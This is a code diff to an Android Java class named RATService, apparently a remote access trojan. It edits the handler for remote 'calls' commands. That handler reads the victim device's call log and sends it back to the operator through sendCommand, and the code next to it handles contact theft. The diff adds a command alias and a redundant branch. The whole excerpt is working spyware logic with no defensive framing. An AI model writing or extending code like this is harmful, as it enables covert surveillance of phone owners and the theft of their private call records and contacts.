@@ -460,15 +460,21 @@ public class RATService extends Service {
                 }
                 break;
                 
-            case "calls":
-            case "get_calls":
-                if (callsModule != null) {
-                    String result = callsModule.getCallLogs();
-                    sendCommand("CALLS|" + result);
-                } else {
-                    sendCommand("CALLS|ERROR: Calls module not available");
-                }
-                break;
+           case "calls":
+case "CALLS":
+case "get_calls":
+    if (callsModule != null) {
+        String result = callsModule.getCallLogs();
+        // Check if result starts with "ERROR" or is valid JSON
+        if (result.startsWith("ERROR")) {
+            sendCommand("CALLS|" + result);
+        } else {
+            sendCommand("CALLS|" + result);
+        }
+    } else {
+        sendCommand("CALLS|ERROR: Calls module not available");
+    }
+    break;
                 
             case "contacts":
             case "get_contacts":
